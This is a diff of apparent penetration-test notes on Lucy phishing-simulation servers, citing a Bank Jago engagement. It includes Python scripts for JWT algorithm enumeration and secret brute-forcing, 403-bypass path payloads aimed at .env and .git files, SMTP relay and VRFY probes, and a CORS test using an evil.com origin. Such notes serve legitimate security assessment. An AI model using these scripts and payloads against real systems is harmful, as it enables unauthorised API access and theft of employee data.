@@ -1,134 +1,112 @@
-# Lucy Security Platform Assessment
+# Lucy Security Awareness Platform Assessment
 
 ## Overview
 
-Lucy Security is a phishing simulation / security awareness training platform. Common in enterprise environments (often on separate infrastructure like Hetzner/DigitalOcean). Runs on PHP (Yii framework) with Apache/nginx.
+Lucy (ThriveDX) is a phishing simulation/security awareness platform. Common at Indonesian banks (Dkatalis/Jago uses it).
 
-## Identification
+## Fingerprint
 
-- `Server: Lucy` header
-- PHP sessions (`PHPSESSID`)
-- Login page title contains organization name + "Login"
-- `/loginforms` endpoint returns JSON with CSRF token and login form templates
-- JS/CSS files tagged with `?v=X.Y.Z` (version disclosure)
-- Default error page mentions "PLEASE EDIT ME IN THE UI UNDER SETTINGS/WHITELABEL"
+- Server header: `Lucy`
+- Login: `/admin/login` (Yii framework)
+- Form fields: `LoginForm[email]`, `LoginForm[password]`, `YII_CSRF_TOKEN`
+- CORS: Often `ACAO: *`, `ACAM: *`, `ACAH: *` (wildcard, no creds)
+- Hosted on Hetzner typically (5.75.x.x)
 
-## Assessment Checklist
+## API Authentication (JWT)
 
-### 1. Version Discovery
-- Check CSS/JS version tags: `/public/assets/all.css?v=4.9.2`
-- Check `/loginforms` response for version indicators
+Lucy REST API uses JWT Bearer tokens. Endpoint: `/api/version`, `/api/campaigns`, `/api/domains`.
 
-### 2. Port Enumeration
-- Port 443: User-facing phishing pages + admin login
-- Port 8443: Dedicated admin interface (common Lucy config)
-- Port 25: SMTP relay for phishing campaigns (Postfix)
-- Port 80: HTTP redirect
+### Algorithm Enumeration (Confirmed — Bank Jago, June 2026)
 
-### 3. API Discovery
-Lucy has a REST API that accepts JWT tokens:
-```bash
-# Check if API exists
-curl -sk "https://target:8443/api/version"
-# Expected: {"error":"No token header."}
+Send tokens with different `alg` values. Error messages reveal accepted algorithm:
 
-# Determine JWT algorithm
-# Send Bearer token with different alg headers:
-# "Algorithm not supported" = not accepted
-# "Algorithm not allowed" = recognized but blocked
-# "Signature verification failed" = THIS IS THE ACCEPTED ALGORITHM
+```python
+import base64, json, subprocess
 
-# Known valid endpoints:
-/api/version    # Version info
-/api/campaigns  # Campaign data (employee emails, results)
-/api/domains    # Domain configuration
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+algorithms = ['HS256','HS384','HS512','RS256','RS384','RS512','none']
+
+for alg in algorithms:
+    header = b64url(json.dumps({'alg':alg,'typ':'JWT'}, separators=(',',':')).encode())
+    payload = b64url(json.dumps({'sub':'1','name':'admin','iat':1516239022}, separators=(',',':')).encode())
+    token = f"{header}.{payload}.invalidsig"
+    # curl -sk -H "Authorization: Bearer $token" https://TARGET/api/version
 ```
 
-### 4. JWT Algorithm Enumeration
-```bash
-for alg in HS256 HS384 HS512 RS256 RS384 RS512 ES256 PS256; do
-  # Build JWT with each alg, send to /api/version
-  # Look for "Signature verification failed" (= accepted alg)
-done
-```
-In Bank Jago engagement: HS512 was the accepted algorithm.
+**Error message interpretation:**
+| Response | Meaning |
+|----------|---------|
+| `"Algorithm not supported"` | Library doesn't implement it (dead end) |
+| `"Algorithm not allowed"` | Recognized but policy-blocked (not usable) |
+| `"Signature verification failed"` | **ACCEPTED** — target for brute-force |
+| `"Wrong number of segments"` | Token format issue (not JWT) |
+| `"No token header."` | Missing Authorization header |
 
-### 5. Sensitive File Probing
-Lucy (Yii framework) has predictable file paths:
-```
-/.env                          # Environment config (JWT secret, DB creds, SMTP creds)
-/.git/HEAD                     # Source code repository
-/protected/config/main.php     # Yii main config
-/protected/config/db.php       # Database credentials
-/protected/runtime/application.log  # Application logs
-/server-status                 # Apache mod_status
-/robots.txt                    # Usually "Disallow: /"
-```
-All typically return 403 (Apache blocks). Bypass attempts:
-- Path traversal via `/public/..%2f.git/HEAD`
-- Case variation `/.GIT/HEAD`
-- Null byte `/.git/HEAD%00.html`
-- Query string `/.git/HEAD?`
-- Semicolon `/.git;/HEAD`
+**Bank Jago result:** HS512 accepted. HS256/384/RS256 blocked. none unsupported.
 
-In Bank Jago engagement: All bypasses failed — Apache blocks at pattern level.
+### JWT Secret Brute-Force
 
-### 6. CORS Testing
-Lucy often has wildcard CORS (misconfiguration):
-```bash
-curl -sk -X OPTIONS "https://target:8443/admin/login" \
-  -H "Origin: https://evil.com" \
-  -H "Access-Control-Request-Method: POST"
-# Look for: Access-Control-Allow-Origin: *
-```
-If wildcard: cross-origin session theft is possible when admin is logged in.
+Once algorithm identified, brute-force with wordlist:
 
-### 7. SMTP Relay Testing
-```bash
-# Banner grab
-nc target 25
-# Check for open relay
-EHLO test.com
-MAIL FROM:<test@test.com>
-RCPT TO:<external@gmail.com>
-# 554 = relay denied (good)
-# 250 = OPEN RELAY (critical finding)
+```python
+import hmac, hashlib, base64, json
 
-# VRFY enumeration
-VRFY postmaster  # 252 = exists
-VRFY admin       # 554 = doesn't exist or relay denied
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header = b64url(json.dumps({'alg':'HS512','typ':'JWT'}, separators=(',',':')).encode())
+payload = b64url(json.dumps({'sub':'1','name':'admin','iat':1516239022}, separators=(',',':')).encode())
+msg = f'{header}.{payload}'.encode()
+
+with open('jwt-secrets.txt') as f:
+    for line in f:
+        secret = line.strip()
+        sig = b64url(hmac.new(secret.encode(), msg, hashlib.sha512).digest())
+        token = f'{header}.{payload}.{sig}'
+        # Test against /api/version — non-error response = cracked
 ```
 
-### 8. Authentication Testing
-- Login form at `/admin` or `/admin/login`
-- CSRF protected (YII_CSRF_TOKEN)
-- Must get fresh session + CSRF before each login attempt
-- Default creds: `admin@admin.com / admin` (rarely works on deployed instances)
-- No password reset endpoint (typically disabled)
-- No registration endpoint
+**Wordlist:** `~/PenTest/Tools/wordlists/jwt-secrets.txt` (104K entries)
 
-### 9. Unauthenticated Endpoints
-```
-/loginforms     # Returns CSRF + all login form HTML templates (always accessible)
-/user           # User-facing phishing landing (302 → /user)
-/public/*       # Static assets (301)
-```
+**Pitfall:** Network flakes during brute-force cause false positives (empty response ≠ valid secret). Always re-verify a "found" secret 3 times before claiming success.
 
-## Key Findings Pattern
+## Web Login
 
-| Finding | Severity | Likelihood |
-|---------|----------|-----------|
-| CORS wildcard on admin | Medium | High (common misconfiguration) |
-| API with JWT auth exposed | Medium | High (always present) |
-| .env/.git on disk (403) | Low-Medium | High (common in deployments) |
-| SMTP VRFY enabled | Low | Medium |
-| SMTP open relay | Critical | Low (usually configured correctly) |
-| Default credentials | Critical | Low (usually changed) |
-| JWT weak secret | High | Low-Medium (depends on deployment) |
+- Yii framework with CSRF token
+- Login always returns 200 regardless of success/failure (check redirect or title)
+- No user enumeration via error messages
+- `/loginforms` — publicly accessible phishing template definitions (not a finding)
 
-## Pitfalls
+## SMTP (Port 25)
 
-- **Rate limiting**: Hetzner-hosted Lucy instances aggressively rate-limit. Don't use large wordlists for directory brute-force. Use targeted lists (50-100 paths max).
-- **CSRF on login**: Must maintain session cookies and extract fresh CSRF token for each login attempt. Stateless brute-force won't work.
-- **403 vs 404 distinction**: Lucy returns custom 404 pages (1078 bytes, pink background "This page does not exist!"). Real 403s are Apache-level (275 bytes). Use size to distinguish.
-- **Port 8443 vs 443**: Admin interface may only be on 8443. Always check both ports — they may have different vhost configs.
+Lucy servers often run Postfix for sending phishing emails:
+- Banner: `220 mail.cloudserver1008.com ESMTP Postfix (Ubuntu)`
+- Requires AUTH PLAIN LOGIN before relay
+- Rejects RCPT TO without auth ("554 5.7.1 Access denied")
+- Disconnects after 2 failed attempts ("421 too many errors")
+- NOT an open relay (confirmed Bank Jago June 2026)
+
+## Additional Ports
+
+| Port | Service | Notes |
+|------|---------|-------|
+| 22 | SSH | Standard |
+| 25 | SMTP (Postfix) | Auth required |
+| 80 | HTTP (Lucy) | Redirects to 443 |
+| 443 | HTTPS (Lucy) | Main admin |
+| 8080 | HTTP-alt | Often same Lucy (redirects to 443) |
+| 8443 | HTTPS-alt | Same Lucy instance |
+
+## CVEs
+
+- CVE-2021-28132 (Lucy < 4.7.x RCE): Patched in newer versions
+- `/admin/support/migration` returns 404 (not 400) on current versions
+- `/public/system/static/` returns 403 (locked down)
+
+## Findings Priority
+
+1. JWT HS512 brute-force → API access → campaign data + employee emails (HIGH if cracked)
+2. CORS wildcard (INFO — no credentials, browsers won't send cookies)
+3. TLS 1.1 supported (LOW)
